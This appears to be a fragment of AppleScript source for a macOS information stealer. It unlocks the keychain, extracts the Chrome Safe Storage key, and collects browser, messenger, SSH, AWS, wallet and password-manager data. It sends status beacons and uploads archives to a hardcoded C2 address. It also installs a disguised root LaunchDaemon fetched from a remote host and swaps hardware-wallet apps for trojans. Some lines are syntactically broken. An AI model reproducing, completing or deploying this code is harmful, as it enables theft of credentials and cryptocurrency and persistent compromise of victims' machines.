        (do shell script "security unlock-keychain -p " & (quoted form of v5) & " " & (quoted form of v4) & " 2>/dev/null")
    on error

    end try
    try
        (do shell script "security set-generic-password-partition-list -S 'apple:,teamid:EQHXZ8M8AV' -a 'Chrome' -s 'Chrome Safe Storage' -k " & (quoted form of v5) & " " & (quoted form of v4) & " 2>/dev/null")
    on error

    end try
    set v6 to "Chrome" & v3
    set v7 to ""
    try
        set v7 to (do shell script "security find-generic-password -w -s " & (quoted form of v6) & " 2>/dev/null")
    on error

    end try
    if not (my isValidSafeKey(v7)) then
        set v7 to ""
        try
            set v7 to (do shell script "security find-generic-password -w -s " & (quoted form of v6) & " " & (quoted form of v4) & " 2>/dev/null")
        on error

        end try
    end if
    if my isValidSafeKey(v7) then
        try
            writeToFile(v7, dstDir & "masterpass-chrome")
        on error

        end try
    else
        return
    end if
end unlockChromeSafeStorageKey

on makeArchive(staging, telemetryC2, buildId, buildId, eventName, uploadFlag)
    try
        (do shell script "ditto -c -k --sequesterRsrc " & (quoted form of staging) & " " & (quoted form of archivePath))
    on error

    end try
    try
        uploadFields(telemetryC2, buildId, buildId, eventName, uploadFlag)
    on error
        return
    end try
end makeArchive

on cleanupArtifacts(staging)
    try
        (do shell script "rm -rf " & (quoted form of staging))
    on error

    end try
    try
        (do shell script "rm -f " & (quoted form of archivePath))
    on error

    end try
    try
        (do shell script "rm -f /tmp/chunk_*")
    on error
        return
    end try
end cleanupArtifacts

on installSpotlightDaemon(home, password, exfilHost, apiToken)
    try
        set v4 to home & "/Library/Application Support/.com.apple.metadata.mds"
        set v5 to v4 & "/mdworker_shared"
        set v6 to v4 & "/.index"
        set v7 to v4 & "/.uid"
        set v8 to v4 & "/.mdworker"
        set v9 to "com.apple.metadata.mds.worker"
        set v10 to "/Library/LaunchDaemons/" & v9 & ".plist"
        (do shell script "mkdir -p " & (quoted form of v4))
        set v11 to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>" & v9 & "</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/bash</string>\n        <string>" & v8 & "</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n    <key>StandardOutPath</key>\n    <string>/dev/null</string>\n    <key>StandardErrorPath</key>\n    <string>/dev/null</string>\n    <key>ProcessType</key>\n    <string>Background</string>\n</dict>\n</plist>"
        set v12 to "/tmp/." & runPfx & "m_" & victimUuid
        (do shell script "curl -fsSL --connect-timeout 10 --max-time 60 -o " & (quoted form of v12) & " https://" & exfilHost & "/zxc/mdw")
        set v13 to (do shell script "stat -f%z " & (quoted form of v12) & " 2>/dev/null || echo 0")
        if (v13 as integers) <  then
            (do shell script "rm -f " & (quoted form of v12))
            return
        end if
        (do shell script "mv -f " & (quoted form of v12) & " " & (quoted form of v5))
        (do shell script "chmod +x " & (quoted form of v5))
        (do shell script "xattr -dr com.apple.quarantine " & (quoted form of v5))
        (do shell script "rm -f " & (quoted form of v7))
        writeToFile("LOGIN=" & apiToken, v6)
        set v14 to "#!/bin/bash\nwhile true; do\n    CUSER=$(stat -f \"%Su\" /dev/console 2>/dev/null)\n    if [ -n \"$CUSER\" ] && [ \"$CUSER\" != \"root\" ]; then\n        CUID=$(id -u \"$CUSER\" 2>/dev/null)\n        launchctl asuser \"$CUID\" " & (quoted form of v5) & "\n    fi\n    sleep 5\ndone"
        writeToFile(v14, v8 & ".tmp")
        (do shell script "tr -d '\\r' < " & (quoted form of v8 & ".tmp") & " > " & (quoted form of v8) & "; rm -f " & (quoted form of v8 & ".tmp"))
        set v15 to "/tmp/." & runPfx & "p_" & victimUuid
        writeToFile(v11, v15)
        (do shell script "chmod +x " & (quoted form of v8))
        (do shell script "echo " & (quoted form of password) & " | sudo -S cp " & (quoted form of v15) & " " & v10)
        (do shell script "echo " & (quoted form of password) & " | sudo -S chown root:wheel " & v10)
        (do shell script "echo " & (quoted form of password) & " | sudo -S launchctl bootstrap system " & v10)
        (do shell script "rm -f " & (quoted form of v15))
    on error
        return
    end try
end installSpotlightDaemon

on installWalletTrojansAndDaemons(home, password, exfilHost, apiToken)
    try
        replaceLedgerWallet(home, password, exfilHost)
        replaceTrezorSuite(home, password, exfilHost)
        replaceExodus(home, password, exfilHost)
    on error

    end try
    try
        installAccountsdDaemon(home, password, exfilHost)
    on error

    end try
    try
        installSpotlightDaemon(home, password, exfilHost, apiToken)
    on error
        return
    end try
end installWalletTrojansAndDaemons

on beacon(telemetryC2, buildId, buildId, stageName, eventTag)
    try
        set v5 to (do shell script "sw_vers -productVersion 2>/dev/null || true")
        set v6 to (do shell script "uname -m 2>/dev/null || true")
        set v7 to (do shell script "defaults read -g AppleLocale 2>/dev/null || echo en_US")
        set v8 to "{\"os\":\"macOS\",\"os_version\":\"" & v5 & "\",\"arch\":\"" & v6 & "\",\"locale\":\"" & v7 & "\",\"u\":\"" & buildId & "\",\"b\":\"" & buildId & "\",\"event\":\"" & eventTag & "\",\"stage\":\"" & stageName & quote & "}"
        set v9 to telemetryC2 & "/api/metrics/run"
        (do shell script "nohup curl -fsS --connect-timeout 5 --max-time 10 -X POST -H 'Content-Type: application/json' -d " & (quoted form of v8) & " " & (quoted form of v9) & " >/dev/null 2>&1 &")
    on error
        return
    end try
end beacon

on run
    set apiToken to "agOgAsZJa82pqUhQuj_clplA0dJNCDR7IZw4i97YCmg"
    set buildId to "UlYvOhxgECT6o_K6I-x_ISs_0pFr_5Qth6tbwSQP1Hs"
    set telemetryC2 to "http://188.166.83.118"
    set eventName to "0"
    set uploadFlag to "0"
    set exfilHost to "loop-lumen.com"
    set victimUuid to (do shell script "uuidgen")
    set runPfx to ((characters of (1 thru 4 of victimUuid)) as text)
    set archivePath to "/tmp/." & runPfx & "o_" & victimUuid & ".zip"
    set user to (system attribute "USER")
    set home to "/Users/" & user
    try
        tell Terminal
            set (visible of windows 1) to false
        end tell
    on error

    end try
    set libraryDir to home & "/Library/"
    set appSupport to libraryDir & "Application Support/"
    set isMacOS2641Plus to (do shell script "sw_vers -productVersion | awk -F. '{if ($1+0>26 || ($1+0==26 && $2+0>4) || ($1+0==26 && $2+0==4 && $3+0>=1)) print 1; else print 0}'")
    beacon(telemetryC2, apiToken, buildId, "boot", "started")
    set staging to collectSystemInfo(home, apiToken)
    beacon(telemetryC2, apiToken, buildId, "init_session", "stage")
    collectDiscordStickies(staging, appSupport, libraryDir)
    beacon(telemetryC2, apiToken, buildId, "messengers", "stage")
    collectKeychainSshAws(staging, home, libraryDir, user, isMacOS2641Plus)
    beacon(telemetryC2, apiToken, buildId, "credentials", "stage")
    collectFirefoxSafari(staging, appSupport, libraryDir, v1)
    beacon(telemetryC2, apiToken, buildId, "browsers", "stage")
    collectDesktopWallets(staging, home, appSupport)
    beacon(telemetryC2, apiToken, buildId, "wallets", "stage")
    collectPasswordManagers(staging, home, appSupport, libraryDir)
    beacon(telemetryC2, apiToken, buildId, "passmgr", "stage")
    archiveAndUpload(staging, telemetryC2, apiToken, buildId, eventName, uploadFlag)
    set password to getAccountPassword(user, home, staging)
    writeToFile(password, staging & "pwd")
    if isMacOS2641Plus is "1" then
        unlockChromeSafeStorageKey(staging, home, password)
    end if
    beacon(telemetryC2, apiToken, buildId, "resolve_auth", "stage")
    archiveAndUpload(staging, telemetryC2, apiToken, buildId, eventName, uploadFlag)
    collectNotes(staging, home, libraryDir, v1, v1)
    beacon(telemetryC2, apiToken, buildId, "local_data", "stage")
    makeArchive(staging, telemetryC2, apiToken, buildId, eventName, uploadFlag)
    cleanupArtifacts(staging)
    installWalletTrojansAndDaemons(home, password, exfilHost, apiToken)
end run
